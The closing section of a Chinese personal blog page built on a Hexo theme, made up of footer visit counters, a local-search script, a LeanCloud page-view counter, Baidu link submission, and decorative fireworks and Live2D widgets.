  <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>

  
    <span class="site-uv">
      <i class="fa fa-user"></i>访问人数
      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
      
    </span>
  

  
    <span class="site-pv">
      <i class="fa fa-eye"></i>总访问量
      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
      次
    </span>
  
</div>








        
      </div>
    </footer>

    

    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  












  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  

  
  
    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>



  
  


  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>



  
  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>



  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>



  


  




	





  





  












  

  <script type="text/javascript">
    // Popup Window;
    var isfetched = false;
    var isXml = true;
    // Search DB path;
    var search_path = "search.xml";
    if (search_path.length === 0) {
      search_path = "search.xml";
    } else if (/json$/i.test(search_path)) {
      isXml = false;
    }
    var path = "/" + search_path;
    // monitor main search box;

    var onPopupClose = function (e) {
      $('.popup').hide();
      $('#local-search-input').val('');
      $('.search-result-list').remove();
      $('#no-result').remove();
      $(".local-search-pop-overlay").remove();
      $('body').css('overflow', '');
    }

    function proceedsearch() {
      $("body")
        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
        .css('overflow', 'hidden');
      $('.search-popup-overlay').click(onPopupClose);
      $('.popup').toggle();
      var $localSearchInput = $('#local-search-input');
      $localSearchInput.attr("autocapitalize", "none");
      $localSearchInput.attr("autocorrect", "off");
      $localSearchInput.focus();
    }

    // search function;
    var searchFunc = function(path, search_id, content_id) {
      'use strict';

      // start loading animation
      $("body")
        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
          '<div id="search-loading-icon">' +
          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
          '</div>' +
          '</div>')
        .css('overflow', 'hidden');
      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');

      $.ajax({
        url: path,
        dataType: isXml ? "xml" : "json",
        async: true,
        success: function(res) {
          // get the contents from search data
          isfetched = true;
          $('.popup').detach().appendTo('.header-inner');
          var datas = isXml ? $("entry", res).map(function() {
            return {
              title: $("title", this).text(),
              content: $("content",this).text(),
              url: $("url" , this).text()
            };
          }).get() : res;
          var input = document.getElementById(search_id);
          var resultContent = document.getElementById(content_id);
          var inputEventFunction = function() {
            var searchText = input.value.trim().toLowerCase();
            var keywords = searchText.split(/[\s\-]+/);
            if (keywords.length > 1) {
              keywords.push(searchText);
            }
            var resultItems = [];
            if (searchText.length > 0) {
              // perform local searching
              datas.forEach(function(data) {
                var isMatch = false;
                var hitCount = 0;
                var searchTextCount = 0;
                var title = data.title.trim();
                var titleInLowerCase = title.toLowerCase();
                var content = data.content.trim().replace(/<[^>]+>/g,"");
                var contentInLowerCase = content.toLowerCase();
                var articleUrl = decodeURIComponent(data.url);
                var indexOfTitle = [];
                var indexOfContent = [];
                // only match articles with not empty titles
                if(title != '') {
                  keywords.forEach(function(keyword) {
                    function getIndexByWord(word, text, caseSensitive) {
                      var wordLen = word.length;
                      if (wordLen === 0) {
                        return [];
                      }
                      var startPosition = 0, position = [], index = [];
                      if (!caseSensitive) {
                        text = text.toLowerCase();
                        word = word.toLowerCase();
                      }
                      while ((position = text.indexOf(word, startPosition)) > -1) {
                        index.push({position: position, word: word});
                        startPosition = position + wordLen;
                      }
                      return index;
                    }

                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
                  });
                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
                    isMatch = true;
                    hitCount = indexOfTitle.length + indexOfContent.length;
                  }
                }

                // show search results

                if (isMatch) {
                  // sort index by position of keyword

                  [indexOfTitle, indexOfContent].forEach(function (index) {
                    index.sort(function (itemLeft, itemRight) {
                      if (itemRight.position !== itemLeft.position) {
                        return itemRight.position - itemLeft.position;
                      } else {
                        return itemLeft.word.length - itemRight.word.length;
                      }
                    });
                  });

                  // merge hits into slices

                  function mergeIntoSlice(text, start, end, index) {
                    var item = index[index.length - 1];
                    var position = item.position;
                    var word = item.word;
                    var hits = [];
                    var searchTextCountInSlice = 0;
                    while (position + word.length <= end && index.length != 0) {
                      if (word === searchText) {
                        searchTextCountInSlice++;
                      }
                      hits.push({position: position, length: word.length});
                      var wordEnd = position + word.length;

                      // move to next position of hit

                      index.pop();
                      while (index.length != 0) {
                        item = index[index.length - 1];
                        position = item.position;
                        word = item.word;
                        if (wordEnd > position) {
                          index.pop();
                        } else {
                          break;
                        }
                      }
                    }
                    searchTextCount += searchTextCountInSlice;
                    return {
                      hits: hits,
                      start: start,
                      end: end,
                      searchTextCount: searchTextCountInSlice
                    };
                  }

                  var slicesOfTitle = [];
                  if (indexOfTitle.length != 0) {
                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
                  }

                  var slicesOfContent = [];
                  while (indexOfContent.length != 0) {
                    var item = indexOfContent[indexOfContent.length - 1];
                    var position = item.position;
                    var word = item.word;
                    // cut out 100 characters
                    var start = position - 20;
                    var end = position + 80;
                    if(start < 0){
                      start = 0;
                    }
                    if (end < position + word.length) {
                      end = position + word.length;
                    }
                    if(end > content.length){
                      end = content.length;
                    }
                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
                  }

                  // sort slices in content by search text's count and hits' count

                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
                      return sliceRight.hits.length - sliceLeft.hits.length;
                    } else {
                      return sliceLeft.start - sliceRight.start;
                    }
                  });

                  // select top N slices in content

                  var upperBound = parseInt('1');
                  if (upperBound >= 0) {
                    slicesOfContent = slicesOfContent.slice(0, upperBound);
                  }

                  // highlight title and content

                  function highlightKeyword(text, slice) {
                    var result = '';
                    var prevEnd = slice.start;
                    slice.hits.forEach(function (hit) {
                      result += text.substring(prevEnd, hit.position);
                      var end = hit.position + hit.length;
                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
                      prevEnd = end;
                    });
                    result += text.substring(prevEnd, slice.end);
                    return result;
                  }

                  var resultItem = '';

                  if (slicesOfTitle.length != 0) {
                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
                  } else {
                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
                  }

                  slicesOfContent.forEach(function (slice) {
                    resultItem += "<a href='" + articleUrl + "'>" +
                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
                      "...</p>" + "</a>";
                  });

                  resultItem += "</li>";
                  resultItems.push({
                    item: resultItem,
                    searchTextCount: searchTextCount,
                    hitCount: hitCount,
                    id: resultItems.length
                  });
                }
              })
            };
            if (keywords.length === 1 && keywords[0] === "") {
              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
            } else if (resultItems.length === 0) {
              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
            } else {
              resultItems.sort(function (resultLeft, resultRight) {
                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
                  return resultRight.searchTextCount - resultLeft.searchTextCount;
                } else if (resultLeft.hitCount !== resultRight.hitCount) {
                  return resultRight.hitCount - resultLeft.hitCount;
                } else {
                  return resultRight.id - resultLeft.id;
                }
              });
              var searchResultList = '<ul class=\"search-result-list\">';
              resultItems.forEach(function (result) {
                searchResultList += result.item;
              })
              searchResultList += "</ul>";
              resultContent.innerHTML = searchResultList;
            }
          }

          if ('auto' === 'auto') {
            input.addEventListener('input', inputEventFunction);
          } else {
            $('.search-icon').click(inputEventFunction);
            input.addEventListener('keypress', function (event) {
              if (event.keyCode === 13) {
                inputEventFunction();
              }
            });
          }

          // remove loading animation
          $(".local-search-pop-overlay").remove();
          $('body').css('overflow', '');

          proceedsearch();
        }
      });
    }

    // handle and trigger popup window;
    $('.popup-trigger').click(function(e) {
      e.stopPropagation();
      if (isfetched === false) {
        searchFunc(path, 'local-search-input', 'local-search-result');
      } else {
        proceedsearch();
      };
    });

    $('.popup-btn-close').click(onPopupClose);
    $('.popup').click(function(e){
      e.stopPropagation();
    });
    $(document).on('keyup', function (event) {
      var shouldDismissSearchPopup = event.which === 27 &&
        $('.search-popup').is(':visible');
      if (shouldDismissSearchPopup) {
        onPopupClose();
      }
    });
  </script>





  

  
  <script src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.4.js"></script>
  <script>AV.initialize("TSaUMM9qwI423iWuECxQWDDh-gzGzoHsz", "2DucY6TQAx8iNNnjFYelMbXV");</script>
  <script>
    function showTime(Counter) {
      var query = new AV.Query(Counter);
      var entries = [];
      var $visitors = $(".leancloud_visitors");

      $visitors.each(function () {
        entries.push( $(this).attr("id").trim() );
      });

      query.containedIn('url', entries);
      query.find()
        .done(function (results) {
          var COUNT_CONTAINER_REF = '.leancloud-visitors-count';

          if (results.length === 0) {
            $visitors.find(COUNT_CONTAINER_REF).text(0);
            return;
          }

          for (var i = 0; i < results.length; i++) {
            var item = results[i];
            var url = item.get('url');
            var time = item.get('time');
            var element = document.getElementById(url);

            $(element).find(COUNT_CONTAINER_REF).text(time);
          }
          for(var i = 0; i < entries.length; i++) {
            var url = entries[i];
            var element = document.getElementById(url);
            var countSpan = $(element).find(COUNT_CONTAINER_REF);
            if( countSpan.text() == '') {
              countSpan.text(0);
            }
          }
        })
        .fail(function (object, error) {
          console.log("Error: " + error.code + " " + error.message);
        });
    }

    function addCount(Counter) {
      var $visitors = $(".leancloud_visitors");
      var url = $visitors.attr('id').trim();
      var title = $visitors.attr('data-flag-title').trim();
      var query = new AV.Query(Counter);

      query.equalTo("url", url);
      query.find({
        success: function(results) {
          if (results.length > 0) {
            var counter = results[0];
            counter.fetchWhenSave(true);
            counter.increment("time");
            counter.save(null, {
              success: function(counter) {
                var $element = $(document.getElementById(url));
                $element.find('.leancloud-visitors-count').text(counter.get('time'));
              },
              error: function(counter, error) {
                console.log('Failed to save Visitor num, with error message: ' + error.message);
              }
            });
          } else {
            var newcounter = new Counter();
            /* Set ACL */
            var acl = new AV.ACL();
            acl.setPublicReadAccess(true);
            acl.setPublicWriteAccess(true);
            newcounter.setACL(acl);
            /* End Set ACL */
            newcounter.set("title", title);
            newcounter.set("url", url);
            newcounter.set("time", 1);
            newcounter.save(null, {
              success: function(newcounter) {
                var $element = $(document.getElementById(url));
                $element.find('.leancloud-visitors-count').text(newcounter.get('time'));
              },
              error: function(newcounter, error) {
                console.log('Failed to create');
              }
            });
          }
        },
        error: function(error) {
          console.log('Error:' + error.code + " " + error.message);
        }
      });
    }

    $(function() {
      var Counter = AV.Object.extend("Counter");
      if ($('.leancloud_visitors').length == 1) {
        addCount(Counter);
      } else if ($('.post-title-link').length > 1) {
        showTime(Counter);
      }
    });
  </script>



  

  
<script>
(function(){
    var bp = document.createElement('script');
    var curProtocol = window.location.protocol.split(':')[0];
    if (curProtocol === 'https') {
        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
    }
    else {
        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
    }
    var s = document.getElementsByTagName("script")[0];
    s.parentNode.insertBefore(bp, s);
})();
</script>


  
  

  

  

  
  <script type="text/javascript" src="/js/src/exturl.js?v=5.1.4"></script>


  
  
 <canvas class="fireworks" style="position: fixed;left: 0;top: 0;z-index: 1; pointer-events: none;" ></canvas> 
 <script type="text/javascript" src="//cdn.bootcss.com/animejs/2.2.0/anime.min.js"></script> 
 <script type="text/javascript" src="/js/src/fireworks.js"></script>


<div class="bg_content">
<canvas id="canvas"></canvas>
</div>
<!-- 雪花特效 -->
<!--<script type="text/javascript">

    document.write('<script type="text/javascript" src="/js/src/snow2.js"><\/script>');

</script>-->

<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"model":{"jsonPath":"/live2dw/assets/shizuku.model.json"},"display":{"position":"left","width":100,"height":200},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
</html>
<script type="text/javascript" src="/js/src/dynamic_bg.js"></script>